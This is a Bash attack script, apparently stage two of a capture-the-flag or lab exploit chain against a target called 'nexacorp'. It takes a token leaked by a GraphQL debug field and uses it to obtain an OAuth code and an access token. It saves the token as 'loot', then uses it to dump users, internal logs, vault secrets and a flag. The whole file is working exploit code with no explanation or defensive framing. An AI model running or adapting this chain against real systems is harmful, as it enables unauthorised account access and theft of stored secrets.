#!/usr/bin/env bash
# Stage 2 — one-shot: recon_token → authorize → code → token → decode → probe
set -euo pipefail
source "$(dirname "$0")/00_config.sh"

CLIENT_ID="nexacorp-prod"
REDIRECT_URI="https://app.nexacorp.io/callback"

echo "[1] recon_token fresco"
RTOK=$(curl -s -X POST "${GQL_URL}" \
  -H "Content-Type: application/json" \
  -d '{"query":"{ debugInfo { recon_token } }"}' | jq -r '.data.debugInfo.recon_token')
echo "    ${RTOK}"

echo "[2] /oauth/authorize → extraer code"
LOC=$(curl -sI -G "${API_URL}/oauth/authorize" \
  --data-urlencode "client_id=${CLIENT_ID}" \
  --data-urlencode "redirect_uri=${REDIRECT_URI}" \
  --data-urlencode "response_type=code" \
  --data-urlencode "recon_token=${RTOK}" \
  --data-urlencode "state=s$(date +%s)" \
  | tr -d '\r' | grep -i '^location:')
echo "    ${LOC}"
CODE=$(echo "${LOC}" | sed -nE 's/.*[?&]code=([^&[:space:]]+).*/\1/p')
echo "    CODE=${CODE}"

if [[ -z "${CODE}" ]]; then echo "[!] code vacío"; exit 1; fi

echo "[3] /oauth/token"
RESP=$(curl -s -X POST "${API_URL}/oauth/token" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "grant_type=authorization_code&code=${CODE}&client_id=${CLIENT_ID}&redirect_uri=${REDIRECT_URI}")
echo "${RESP}" | jq || echo "${RESP}"

JWT=$(echo "${RESP}" | jq -r '.access_token // .id_token // .token // empty' 2>/dev/null || true)
if [[ -z "${JWT}" ]]; then echo "[!] sin access_token"; exit 1; fi

echo "${JWT}" > "${LOOT_DIR}/stage2_access_token.jwt"

echo
echo "[4] JWT payload decoded"
echo "${JWT}" | cut -d. -f2 | base64 -d 2>/dev/null | jq

echo
echo "[5] /api/v2/users/me"
curl -s "${API_URL}/api/v2/users/me" -H "Authorization: Bearer ${JWT}" | jq

echo
echo "[6] GraphQL { me users internalLogs }"
curl -s -X POST "${GQL_URL}" \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer ${JWT}" \
  -d '{"query":"{ me { id email role permissions } users { id email role } internalLogs vaultSecrets { id key value classification accessLevel } debugInfo { flag } }"}' | jq

echo
echo "[7] /api/vault/critical-secrets"
curl -s "${API_URL}/api/vault/critical-secrets" -H "Authorization: Bearer ${JWT}" | jq
